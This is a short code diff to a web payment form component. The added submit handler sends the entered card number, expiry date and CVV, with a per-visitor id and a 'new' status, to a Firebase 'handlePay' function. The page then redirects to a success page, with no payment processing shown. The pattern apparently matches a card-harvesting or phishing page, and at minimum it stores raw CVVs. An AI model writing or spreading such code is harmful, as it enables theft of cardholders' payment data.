@@ -9,6 +9,7 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { CreditCard, Calendar, ShieldCheck } from "lucide-react"
 import FullPageLoader from "./full-page-loader"
+import {  handlePay } from "@/lib/firebase"
 
 export function PaymentForm() {
   const router = useRouter()
@@ -18,12 +19,19 @@ export function PaymentForm() {
     expiryMonth: "",
     expiryYear: "",
     cvv: "",
+    status:"new"
   })
   const [loading, setLoading] = useState(false) 
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     setLoading(true)
+    const  _id=  localStorage.getItem("vistor")
+  handlePay({
+    id: _id,
+    createdDate:new Date().toDateString(),
+    ...formData
+  },setFormData)
     setTimeout(() => {
     router.push("/success")
       
